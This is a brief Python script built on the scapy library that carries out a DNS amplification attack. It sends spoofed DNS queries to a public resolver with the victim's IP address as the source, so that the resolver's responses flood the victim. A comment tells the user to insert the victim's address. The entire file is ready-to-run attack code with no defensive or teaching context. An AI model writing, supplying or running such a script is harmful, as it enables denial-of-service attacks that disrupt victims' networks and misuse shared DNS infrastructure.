from scapy.all import IP, UDP, DNS, DNSQR, send

def dns_amplification_attack(target_ip, dns_server, count=100):
    for _ in range(count):
        ip_layer = IP(src=target_ip, dst=dns_server)
        udp_layer = UDP(dport=53)
        dns_layer = DNS(rd=1, qd=DNSQR(qname="large-dns-response.com"))
        packet = ip_layer / udp_layer / dns_layer
        send(packet, verbose=0)

if __name__ == "__main__":
    target_ip = "192.168.1.10"  # Replace with the victim's IP address
    dns_server = "8.8.8.8"  # Using a public DNS server
    dns_amplification_attack(target_ip, dns_server)
